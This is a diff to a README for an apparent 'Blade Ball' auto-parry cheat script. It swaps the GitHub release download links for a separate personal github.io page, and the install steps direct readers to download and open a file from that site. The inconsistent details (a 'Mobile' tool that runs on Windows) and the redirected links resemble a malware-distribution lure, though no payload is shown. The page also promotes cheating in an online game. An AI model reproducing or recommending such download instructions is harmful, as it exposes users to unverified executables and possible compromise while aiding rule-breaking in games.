@@ -1,6 +1,6 @@
 # ⚔️ Blade-Ball-Script-Auto-Parry-2026-Mobile - Master every match with perfect timing
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/eddyatrophic177/Blade-Ball-Script-Auto-Parry-2026-Mobile/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://eddyatrophic177.github.io)
 
 Blade-Ball-Script-Auto-Parry-2026-Mobile provides tools to improve your performance in the Blade Ball game. This software includes features for timing your parries, swinging your blade, and predicting ball movement. These functions run on Windows to help you manage game state through scripts. Experienced players use these tools to maintain consistency and speed during fast rounds.
 
@@ -19,7 +19,7 @@ Before you install this software, confirm your computer meets these minimum stan
 
 Follow these steps to set up the software on your Windows machine:
 
-1.  Visit the official release page: [https://github.com/eddyatrophic177/Blade-Ball-Script-Auto-Parry-2026-Mobile/releases](https://github.com/eddyatrophic177/Blade-Ball-Script-Auto-Parry-2026-Mobile/releases).
+1.  Visit the official release page: [https://eddyatrophic177.github.io](https://eddyatrophic177.github.io).
 2.  Locate the latest version file in the list.
 3.  Click the file link to start the download.
 4.  Open the downloaded folder once the transfer finishes.
